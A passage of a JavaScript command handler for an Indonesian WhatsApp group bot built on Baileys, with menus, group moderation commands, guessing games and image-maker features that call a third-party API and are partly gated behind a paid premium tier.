require('../config/settings')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const fs = require("fs");
const cheerio = require("cheerio");
const chalk = require("chalk");
const crypto = require("crypto");
const { exec, spawn, execSync } = require("child_process");
const axios = require("axios");
const moment = require("moment-timezone");
const fetch = require("node-fetch");
const Jimp = require("jimp");
const util = require("util");
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { color, bgcolor, mycolor } = require('./lib/color')
const anon = require('./lib/menfess')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./lib/exif')
const { TelegraPh, UploadFileUgu, AnonFiles } = require("./lib/uploader_Media");
const msgFilter = require("./lib/func_Spam");
const { smsg, makeid, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, parseMention, getRandom } = require('./lib/functions')
module.exports = xd = async (xd, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const from = m.key.remoteJid
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await xd.decodeJid(xd.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const { chats } = m
// db
let orang_spam = []
const antilink = JSON.parse(fs.readFileSync('./js/db/antilink.json'))
const owner = JSON.parse(fs.readFileSync('./js/db/premium.json').toString())
const pler = JSON.parse(fs.readFileSync('./js/db/idgrup.json').toString())
//pisah
 const isAntiLink = m.isGroup ? antilink.includes(m.chat) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const isGroup = m.key.remoteJid.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await xd.groupMetadata(m.chat).catch(e => {}) : ''
const isPremium = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const groupMembers = m.isGroup ? groupMetadata.participants : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const jangan = m.isGroup ? pler.includes(m.chat) : false
const isCommand = body.startsWith(prefix);
const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;

if (!xd.public) {
if (!m.key.fromMe) return
}

// auto read
xd.readMessages([m.key])
// auto ketik
await xd.sendPresenceUpdate('composing', from)
if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }

try {
ppuser = await xd.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

const generateProfilePicture = async(buffer) => {
const jimp_1 = await Jimp.read(buffer);
const resz = jimp_1.getWidth() > jimp_1.getHeight() ? jimp_1.resize(550, Jimp.AUTO) : jimp_1.resize(Jimp.AUTO, 650)
const jimp_2 = await Jimp.read(await resz.getBufferAsync(Jimp.MIME_JPEG));
return {
img: await resz.getBufferAsync(Jimp.MIME_JPEG)
}
}
// anti spam

//api
var lolnya = await fetchJson('https://apinya.xd-team-botz.repl.co/lol.json')
var lolkey = lolnya.result
// waktu
	var ase = new Date();
var jamss = ase.getHours();
 switch(jamss){
case 0: jamss = "Malam"; break;
case 1: jamss = "Malam"; break;
case 2: jamss = "Malam"; break;
case 3: jamss = "Pagi 🌔"; break;
case 4: jamss = "Pagi🌔"; break;
case 5: jamss = "Pagi 🌄"; break;
case 6: jamss = "Pagi 🌄"; break;
case 7: jamss = "Pagi 🌄"; break;
case 8: jamss = "Pagi ☀️"; break;
case 9: jamss = "Pagi ☀️"; break;
case 10: jamss = "Pagi ☀️"; break;
case 11: jamss = "Siang 🌞"; break;
case 12: jamss = "Siang 🌞"; break;
case 13: jamss = "Siang 🌞"; break;
case 14: jamss = "Siang 🌞"; break;
case 15: jamss = "Siang🌞"; break;
case 16: jamss = "Sore ☀️"; break;
case 17: jamss = "Sore 🌄"; break;
case 18: jamss = "Sore 🌄"; break;
case 19: jamss = "Malam 🌙"; break;
case 20: jamss = "Malam 🌙"; break;
case 21: jamss = "Malam 🌙"; break;
case 22: jamss = "Malam 🌙"; break;
case 23: jamss = "Malam 🌚"; break;
}
var tampilUcapan = "" + jamss;
const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 januari 2021').getTime()
const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString(locale, { weekday: 'long' })
const calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/27/ee/27/27ee271709bdb24d555b2dd3de796f93.jpg')
}
if(time2 < "19:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/27/ee/27/27ee271709bdb24d555b2dd3de796f93.jpg')
 }
if(time2 < "18:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/08/7b/81087b2e732dc0e25d8875b135d579b9.jpg')
 }
if(time2 < "15:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/98/aa/8198aaf07083fc9939deb0c3c5c3716c.jpg')
 }
if(time2 < "11:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/81/98/aa/8198aaf07083fc9939deb0c3c5c3716c.jpg')
 }
if(time2 < "06:00:00"){
var imageTime = await getBuffer('https://i.pinimg.com/736x/15/8e/ea/158eea299c01433aae6744599d2fdc3a.jpg')
}

 
	//
 // antilink
	if (isAntiLink) 
if (budy.includes('https://','http://' )) {
if (!isAdmins) {
await xd.sendMessage(m.chat, {text :'Link Detected Anda Akan Terkick Dalam 3detik'}, {quoted : m} )
await sleep(3000)
xd.groupParticipantsUpdate(from, [sender], "remove")
}
	  }

const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
+ 'VERSION:3.0\n' 
+ 'FN:OWNER\n'
+ 'ORG:' + global.author + '\n' // the organization of the contact
+ 'TEL;type=CELL;type=VOICE;waid=' + global.owner + ':+' + global.owner + '\n' // WhatsApp ID + phone number
+ 'END:VCARD'
 
  // Function for Anti Spam
msgFilter.ResetSpam(orang_spam)

const spampm = () => {
console.log(color('~>[SPAM DETECTED]', 'red'), color(moment(m.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname))
msgFilter.addSpam(sender, orang_spam)
tspm1 = `[SPAM DETECTED]
Tunggu Beberapa Detik...`
xd.sendMessage(from, {text : tspm1}, {quoted:m})
}
const spamgr = () => {
console.log(color('~>[SPAM DETECTED]', 'red'), color(moment(m.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
msgFilter.addSpam(sender, orang_spam)
tspm2 = `[SPAM DETECTED]
Tunggu Beberapa Detik...`
xd.sendMessage(from, {text : tspm2}, {quoted:m})
}

if (isCmd && msgFilter.isFiltered(sender) && !isGroup) return spampm()
if (isCmd && msgFilter.isFiltered(sender) && isGroup) return spamgr()
if (isCmd && args.length < 1 && !isCreator && !isPremium) msgFilter.addFilter(sender)

pritprit = `sepertinya kamu belum daftar premium
silahkan beli premium ke owner harga 3k
keuntungan premium:
1. unlock all fitur
2. pakai bot sesuka hati
3. tanpa jeda


`
switch (command) {

 // menu 

 case 'menu': case 'p': case 'halo':  {
  if (jangan) return
  if (!isCommand) return
ptir = "```"
picnya = global.pic
await sleep(1000)

menutext = `${ptir}*──────❲ ${global.namabot} ❳──────*

╭─⬣「 USER INFO 」⬣
│• ID : @${sender.split('@')[0]}
│• Nama : ${pushname}
│• Premium Status : ${isPremium? '👑':'🆓'}
│• Bot Version : 5



ingin ngobrol denganku?
silahkah pakai code ${prefix}ai
CONTOH : ${prefix}ai halo

GROUP INFO BOT : 
${global.group}

╭─⬣「 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 」⬣
│➥⬣${prefix}addprem
│➥⬣${prefix}delprem
│➥⬣${prefix}listpc
│➥⬣${prefix}setppbot
╰─⬣
╭─⬣「 𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 」⬣
│➥⬣${prefix}instagram
│➥⬣${prefix}tiktok
│➥⬣${prefix}tiktokmp3
│➥⬣${prefix}playmp3
│➥⬣${prefix}playmp4
│➥⬣${prefix}ytdl
│➥⬣${prefix}pinterest
│➥⬣${prefix}tourl
│➥⬣${prefix}nulis
│➥⬣${prefix}jadianime
╰─⬣
╭─⬣「 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨 」⬣
│➥⬣${prefix}antilink on/off
│➥⬣${prefix}mute on/off
│➥⬣${prefix}linkgc
│➥⬣${prefix}open
│➥⬣${prefix}close
│➥⬣${prefix}kick
│➥⬣${prefix}add
│➥⬣${prefix}promote
│➥⬣${prefix}demote
│➥⬣${prefix}tagall
╰─⬣
╭─⬣「 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨 」⬣
│➥⬣${prefix}darkjoke
│➥⬣${prefix}asupan
│➥⬣${prefix}sound
│➥⬣${prefix}meme
│➥⬣${prefix}vn
╰─⬣
╭─⬣「 𝗦𝗘𝗖𝗥𝗘𝗧 𝗖𝗛𝗔𝗧 」⬣
│➥⬣${prefix}secretchat
│➥⬣${prefix}pesanrahasia
╰─⬣
╭─⬣「 𝗥𝗔𝗡𝗗𝗢𝗠 𝗠𝗘𝗡𝗨 」⬣
│➥⬣${prefix}waifu
│➥⬣${prefix}husbu
│➥⬣${prefix}cecan
│➥⬣${prefix}cogan
╰─⬣
╭─⬣「 𝗚𝗔𝗠𝗘 𝗠𝗘𝗡𝗨 」⬣
│➥⬣${prefix}tebakgambar
│➥⬣${prefix}tebaksiapa
│➥⬣${prefix}tebakbendera
│➥⬣${prefix}tebakkata
│➥⬣${prefix}asahotak
│➥⬣${prefix}caklontong
╰─⬣
╭─⬣「 𝗜𝗦𝗘𝗡𝗚 𝗠𝗘𝗡𝗨 」⬣
│➥⬣${prefix}verif
│➥⬣${prefix}logout
╰─⬣
╭─⬣「 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗠𝗘𝗡𝗨 」⬣
│➥⬣${prefix}stiker
│➥⬣${prefix}stikerwm
│➥⬣${prefix}sendsticker
│➥⬣${prefix}toimage
│➥⬣${prefix}smeme
│➥⬣${prefix}ttp1
│➥⬣${prefix}ttp2
│➥⬣${prefix}ttp3
│➥⬣${prefix}ttp4
│➥⬣${prefix}ttp5
│➥⬣${prefix}ttp6
╰─⬣
╭─⬣「 𝗜𝗠𝗔𝗚𝗘 𝗠𝗔𝗞𝗘𝗥 」⬣
│➥⬣${prefix}blackpink
│➥⬣${prefix}bloodfrosted
│➥⬣${prefix}bokeh
│➥⬣${prefix}box3d
│➥⬣${prefix}breakwall
│➥⬣${prefix}cloud
│➥⬣${prefix}toxic
│➥⬣${prefix}pornhub
╰─⬣

RULES : 

1. Dilarang Spam Bot
2. Dilarang Call/Vc Bot
╰─⬣
${ptir}`

xd.sendMessage(m.chat, { image : { url : global.pic}, caption : menutext})}
break




 case 'ai':{
  if (jangan) return
  if (!isCommand) return
  if (!q) return m.reply(`pertanyaanya?`)
  
  var simi = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${lolkey}&text=${q}&badword=true`)
  xd.sendMessage(m.chat, {text : simi.result}, {quoted : m})
 }
  break
  // group area 
  	case 'add': {
      if (jangan) return
  if (!isCommand) return
if (!isCreator) return m.reply(`fitur ini khusus developer bot saja`)
if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)  
if (!isGroupAdmins) return 
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xd.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
  case 'kick': 
        if (jangan) return
  if (!isCommand) return
          if (!q) return m.reply(`Tag Orangnya`)
{
 if (!isCreator) return m.reply(`fitur ini khusus developer bot saja`)
if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)  
if (!isGroupAdmins) return 
m.reply(`otw kick`)
await sleep(2000)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xd.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(`DONE`))
}
break
	case 'promote': {
        if (jangan) return
  if (!isCommand) return
          if (!q) return m.reply(`Tag Orangnya`)
          if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)  
if (!isGroupAdmins) return 
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xd.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('SUCCES MEMBUAT ' + users + ' MENJADI ADMIN'))
	}
	break
	case 'demote': {
        if (jangan) return
  if (!isCommand) return
        if (!q) return m.reply(`Tag Orangnya`)
        if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)  
if (!isGroupAdmins) return 
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xd.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('SUCCES MEMBUAT ' + users + ' MENJADI NON ADMIN'))
	}
	break
 case 'tagall': {
     if (jangan) return
  if (!isCommand) return
  if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)  
if (!isGroupAdmins) return 
let teks = `Tag all\n`
  for (let mem of participants) {
  teks += `› @${mem.id.split('@')[0]}\n`
  }
  xd.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
  }
  break
  case 'hidetag':
case 'tag': { 
    if (jangan) return
  if (!isCommand) return
  if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)  
if (!isGroupAdmins) return 
xd.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'linkgc':
        if (jangan) return
  if (!isCommand) return
  if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return m.reply(`Adminin dlu bjir`)  
if (!isGroupAdmins) return m.reply(`lu siape?`)
var url = await xd.groupInviteCode(m.chat).catch(() => m.reply(mess.error.api))
url = 'https://chat.whatsapp.com/'+url
m.reply(url)
break

case 'close':
  if (!isCommand) return
  if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)  
if (!isGroupAdmins) return m.reply(`lu siape?`)
xd.groupSettingUpdate(m.chat, 'announcement')
m.reply(`succes`)
break
case 'open':
  if (!isCommand) return
  if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)  
if (!isGroupAdmins) return m.reply(`lu siape?`)
xd.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`succes`)
break
case 'revoke': 
        if (jangan) return
  if (!isCommand) return
if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)
if (!isAdmins) return  m.reply(`Khusus Admin`)
await xd.groupRevokeInvite(m.chat)
.then( res => {
m.reply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => m.reply(mess.error.api))
break
 case 'mute':
        
  if (!isCommand) return
    if (!q) return m.reply(`on/off ???`)
    if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)
if (!isAdmins) return  m.reply(`Khusus Admin`)
if (args[0] === 'on') {
if (jangan) return m.reply('Sudah Aktif Kak')
pler.push(m.chat)
fs.writeFileSync('./js/db/idgrup.json', JSON.stringify(pler))
m.reply('Sukses mengaktifkan fitur mute')

} else if (args[0] === 'off') {
if (!jangan) return m.reply('Sudah Mati Kak')
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./js/db/idgrup.json', JSON.stringify(pler))
m.reply('Sukses menonaktifkan fitur mute')
} else if (!q){
m.reply(`Pilih Mute On / Off `)
}
break 
   
  case 'antilink':
        
  if (!isCommand) return
    if (!q) return m.reply(`on/off ???`)
if (!isGroup) return m.reply(`digrup bang`)
if (!isBotAdmins) return  m.reply(`Adminin dlu bjir`)
if (!isAdmins) return  m.reply(`Khusus Admin`)
if (args[0] === 'on') {
if (isAntiLink) return m.reply('Sudah Aktif Kak')
antilink.push(m.chat)
fs.writeFileSync('./js/db/antilink.json', JSON.stringify(antilink))
m.reply('Sukses mengaktifkan fitur antilink')
xd.sendMessage(m.chat,  {text: `ALLERT!!! Group ini sudah di pasang anti link\nJika Kamu Melanggar Maka Akan Saya Tendang`})
} else if (args[0] === 'off') {
if (!isAntiLink) return m.reply('Sudah Mati Kak')
var ini = antilink.indexOf(m.chat)
antilink.splice(ini, 1)
fs.writeFileSync('./js/db/antilink.json', JSON.stringify(antilink))
m.reply('Sukses menonaktifkan fitur antilink')
} else if (!q){
m.reply(`Pilih Antilink On / Off `)
}
break 
// game area
case 'caklontong': {
  if (jangan) return
  if (!isCommand) return

  var gamee = await fetchJson(`https://api.lolhuman.xyz/api/tebak/caklontong2?apikey=${lolkey}`)
  xd.sendMessage(m.chat, {text : "PERTANYAAN : " + gamee.result.question}, {quoted : m})
  await sleep(1000)
  xd.sendMessage(m.chat, {text : "20 detik waktu tersisa untuk menjawab"})
  await sleep(10000)
  xd.sendMessage(m.chat, {text : "10 detik waktu tersisa untuk menjawab"})
  await sleep(10000)
  xd.sendMessage(m.chat, {text : "jawaban : " + gamee.result.answer}, {quoted : m})
  xd.sendMessage(m.chat, {text : gamee.result.information}, {quoted : m})
  }
  break
case 'tebaksiapa': {
  if (jangan) return
  if (!isCommand) return

var gamee = await fetchJson(`https://api.lolhuman.xyz/api/tebak/siapaaku?apikey=${lolkey}`)
xd.sendMessage(m.chat, {text : "PERTANYAAN : " + gamee.result.question}, {quoted : m})
await sleep(1000)
xd.sendMessage(m.chat, {text : "20 detik waktu tersisa untuk menjawab"})
await sleep(10000)
xd.sendMessage(m.chat, {text : "10 detik waktu tersisa untuk menjawab"})
await sleep(10000)
xd.sendMessage(m.chat, {text : "jawaban : " + gamee.result.answer}, {quoted : m})

}
break
case 'tebakgambar': {
  if (jangan) return
  if (!isCommand) return

var gamee = await fetchJson(`https://api.lolhuman.xyz/api/tebak/gambar?apikey=${lolkey}`)
xd.sendMessage(m.chat, {image: {url: gamee.result.image}, caption: " 30 detik waktu tersisa untuk menjawab" }, {quoted : m})
await sleep(10000)
xd.sendMessage(m.chat, {text : "20 detik waktu tersisa untuk menjawab"})
await sleep(10000)
xd.sendMessage(m.chat, {text : "10 detik waktu tersisa untuk menjawab"})
await sleep(10000)
xd.sendMessage(m.chat, {text : "jawaban : " + gamee.result.answer}, {quoted : m})

}
break
 case 'tebakbendera': {
  if (jangan) return
  if (!isCommand) return
var gamee = await fetchJson(`https://api.lolhuman.xyz/api/tebak/bendera?apikey=${lolkey}`)
xd.sendMessage(m.chat, {text : "PERTANYAAN : " + gamee.result.flag}, {quoted : m})
await sleep(1000)
xd.sendMessage(m.chat, {text : "20 detik waktu tersisa untuk menjawab"})
await sleep(10000)
xd.sendMessage(m.chat, {text : "10 detik waktu tersisa untuk menjawab"})
await sleep(10000)
xd.sendMessage(m.chat, {text : "jawaban : " + gamee.result.name}, {quoted : m})

}
break
case 'tebakkata': {
  if (jangan) return
  if (!isCommand) return
var gamee = await fetchJson(`https://api.lolhuman.xyz/api/tebak/kata?apikey=${lolkey}`)
xd.sendMessage(m.chat, {text : "PERTANYAAN : " + gamee.result.pertanyaan}, {quoted : m})
await sleep(1000)
xd.sendMessage(m.chat, {text : "20 detik waktu tersisa untuk menjawab"})
await sleep(10000)
xd.sendMessage(m.chat, {text : "10 detik waktu tersisa untuk menjawab"})
await sleep(10000)
xd.sendMessage(m.chat, {text : "jawaban : " + gamee.result.jawaban}, {quoted : m})

}
break
case 'asahotak': {
  if (jangan) return
  if (!isCommand) return
  var gamee = await fetchJson(`https://api.lolhuman.xyz/api/tebak/asahotak?apikey=${lolkey}`)
  xd.sendMessage(m.chat, {text : "PERTANYAAN : " + gamee.result.pertanyaan}, {quoted : m})
  await sleep(1000)
  xd.sendMessage(m.chat, {text : "20 detik waktu tersisa untuk menjawab"})
  await sleep(10000)
  xd.sendMessage(m.chat, {text : "10 detik waktu tersisa untuk menjawab"})
  await sleep(10000)
  xd.sendMessage(m.chat, {text : "jawaban : " + gamee.result.jawaban}, {quoted : m})
  
  }
  break
 // image maker
 case 'blackpink':
 case 'bloodfrosted':
 case 'bokeh':
  case 'box3d':
  case 'breakwall':
  case 'cloud':
  case 'toxic':{
    if (jangan) return
  if (!isCommand) return
if (!q) return m.reply(`CONTOH : ${prefix + command} KurrXd`)
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  var hsl = `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolkey}&text=${q}` 
  

xd.sendMessage(m.chat, { image : { url : hsl}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
break
case 'nulis':{
  if (jangan) return
  if (!isCommand) return
  if (!q) return m.reply(`CONTOH : ${prefix + command} KurrXd`)
    if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
    var hsl = `https://api.lolhuman.xyz/api/nulis?apikey=${lolkey}&text=${q}` 
    xd.sendMessage(m.chat, { image : { url : hsl}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
    break
case 'pornhub':{
  if (jangan) return
  if (!isCommand) return
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
    if (!q) return m.reply(`CONTOH : ${prefix + command} KurrXd`)
  
 var awal = q.split('|')[0]
var akhir = q.split('|')[1]
if (!awal) return  m.reply(`CONTOH : ${prefix+command} Kurr|Xd`)
if (!akhir) return m.reply(`CONTOH : ${prefix+command} Kurr|Xd`)
  var hsl = `https://api.lolhuman.xyz/api/textprome2/pornhub?apikey=${lolkey}&text1=${awal}&text2=${akhir}` 
  xd.sendMessage(m.chat, { image : { url : hsl}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
break
  
// islami area
case 'surah':{
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
if (jangan) return
if (!isCommand) return
if (!q) return m.reply(`surah keberapa?`)
hase =  `https://api.lolhuman.xyz/api/quran/audio/${q}?apikey=${lolkey}`
xd.sendMessage(m.chat, {audio: {url : hase }, mimetype:'audio/mpeg', ptt:true})
}
break
case 'surah':{
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
if (jangan) return
if (!isCommand) return
if (!q) return m.reply(`surah keberapa?`)
hase =  `https://api.lolhuman.xyz/api/quran/audio/${q}?apikey=${lolkey}`
xd.sendMessage(m.chat, {audio: {url : hase }, mimetype:'audio/mpeg', ptt:true})
}
break
case 'kisahnabi':{
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
if (jangan) return
if (!isCommand) return
if (!q) return m.reply(`kisah Nabi Apa?`)
hase =  await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${q}?apikey=${lolkey}`)
nabii = hase.result
hasilnya = `Kisah Nabi ${nabii.name}
Tahun Lahir : ${nabii.thn_kelahiran}
Tempat Tinggal : ${nabii.place}

${nabii.story}
`
xd.sendMessage(m.chat, {text: hasilnya })
}
break
case 'niatshalat':{
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
if (jangan) return
if (!isCommand) return
if (!q) return m.reply(`Niat Shalat Apa?`)
hase =  await fetchJson(`https://api.lolhuman.xyz/api/niatsholat/${q}?apikey=${lolkey}`)
niatt = hase.result
hasilnya = ` ${niatt.name} :
${niatt.ar}

${niatt.latin}

artinya : ${niatt.id}
`
xd.sendMessage(m.chat, {text: hasilnya })
}
break
  // random  area
 case 'asupan':{
  if (jangan) return
  if (!isCommand) return
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
  var asu = await fetchJson(`https://api.lolhuman.xyz/api/asupan?apikey=${lolkey}`)
  var inti = asu.result
 xd.sendMessage(m.chat, { video : { url : asu}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
  break
case 'meme':{
  if (jangan) return
  if (!isCommand) return
 if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
var imeme = `https://api.lolhuman.xyz/api/meme/memeindo?apikey=${lolkey}`
xd.sendMessage(m.chat, { image : { url : imeme}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
break
  
 case 'darkjoke':{
  if (jangan) return
  if (!isCommand) return
  if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
var intinya = `https://api.lolhuman.xyz/api/meme/darkjoke?apikey=${lolkey}`
xd.sendMessage(m.chat, { image : { url : intinya}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
break

case 'husbu':{
  if (jangan) return
  if (!isCommand) return
 if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
var intinya = `https://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=anime%20boy%20cool`
xd.sendMessage(m.chat, { image : { url : intinya}, caption : 'Jangan Lupa Subs Youtube : KurrXd OFFICIAL'})}
break

case 'cogan':{
  if (jangan) return
  if (!isCommand) return
 if (!isPremium) return xd.sendMessage(m.chat, { text : pritprit },  { quoted: m })
